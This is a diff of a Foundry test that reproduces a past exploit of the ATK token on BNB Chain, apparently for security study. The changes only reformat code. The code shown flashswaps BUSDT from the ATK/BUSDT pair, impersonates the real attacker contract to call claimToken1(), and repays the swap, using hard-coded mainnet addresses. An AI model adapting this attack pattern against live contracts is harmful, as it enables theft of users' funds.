@@ -31,20 +31,14 @@ import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
 // Root cause: getPrice() function
 
 contract ContractTest is Test {
-    IWBNB constant WBNB_TOKEN =
-        IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    IERC20 constant ATK_TOKEN =
-        IERC20(0x9cB928Bf50ED220aC8f703bce35BE5ce7F56C99c);
-    IERC20 constant BUSDT_TOKEN =
-        IERC20(0x55d398326f99059fF775485246999027B3197955);
-    IUniswapV2Router constant PS_ROUTER =
-        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
-    IUniswapV2Pair constant ATK_BUSDT_PAIR =
-        IUniswapV2Pair(0xd228fAee4f73a73fcC73B6d9a1BD25EE1D6ee611);
-    address constant EXPLOIT_CONTRACT =
-        0xD7ba198ce82f4c46AD8F6148CCFDB41866750231;
-    address constant EXPLOIT_AUX_CONTRACT =
-        0x96bF2E6CC029363B57Ffa5984b943f825D333614;
+
+    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+    IERC20 constant ATK_TOKEN = IERC20(0x9cB928Bf50ED220aC8f703bce35BE5ce7F56C99c);
+    IERC20 constant BUSDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955);
+    IUniswapV2Router constant PS_ROUTER = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IUniswapV2Pair constant ATK_BUSDT_PAIR = IUniswapV2Pair(0xd228fAee4f73a73fcC73B6d9a1BD25EE1D6ee611);
+    address constant EXPLOIT_CONTRACT = 0xD7ba198ce82f4c46AD8F6148CCFDB41866750231;
+    address constant EXPLOIT_AUX_CONTRACT = 0x96bF2E6CC029363B57Ffa5984b943f825D333614;
 
     uint256 swapamount;
 
@@ -62,9 +56,7 @@ contract ContractTest is Test {
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "[Start] Attacker ATK balance before exploit",
-            ATK_TOKEN.balanceOf(EXPLOIT_CONTRACT),
-            18
+            "[Start] Attacker ATK balance before exploit", ATK_TOKEN.balanceOf(EXPLOIT_CONTRACT), 18
         );
 
         WBNB_TOKEN.deposit{value: 2 ether}();
@@ -74,33 +66,23 @@ contract ContractTest is Test {
         ATK_BUSDT_PAIR.swap(swapamount, 0, address(this), new bytes(1));
 
         emit log_named_decimal_uint(
-            "[End] Attacker ATK balance after exploit",
-            ATK_TOKEN.balanceOf(EXPLOIT_CONTRACT),
-            18
+            "[End] Attacker ATK balance after exploit", ATK_TOKEN.balanceOf(EXPLOIT_CONTRACT), 18
         );
     }
 
     /*
      * Callback function called by PancakeSwap during the flashswap
      */
-    function pancakeCall(
-        address /*sender*/,
-        uint256 /*amount0*/,
-        uint256 /*amount1*/,
-        bytes calldata /*data*/
-    ) public {
+    function pancakeCall(address, /*sender*/ uint256, /*amount0*/ uint256, /*amount1*/ bytes calldata /*data*/ )
+        public
+    {
         // EXPLOIT_CONTRACT calls `claimToken1()` function
         vm.prank(EXPLOIT_CONTRACT);
-        (bool success, ) = EXPLOIT_AUX_CONTRACT.call(
-            abi.encodeWithSignature("claimToken1()")
-        );
+        (bool success,) = EXPLOIT_AUX_CONTRACT.call(abi.encodeWithSignature("claimToken1()"));
         require(success, "Call `claimToken1()` failed");
 
         // Return the BUSDT to the ATK_BUSDT_PAIR
-        BUSDT_TOKEN.transfer(
-            address(ATK_BUSDT_PAIR),
-            (swapamount * 10_000) / 9975 + 1000
-        );
+        BUSDT_TOKEN.transfer(address(ATK_BUSDT_PAIR), (swapamount * 10_000) / 9975 + 1000);
     }
 
     /**
@@ -112,11 +94,8 @@ contract ContractTest is Test {
         path[0] = address(WBNB_TOKEN);
         path[1] = address(BUSDT_TOKEN);
         PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBNB_TOKEN.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            WBNB_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
+
 }
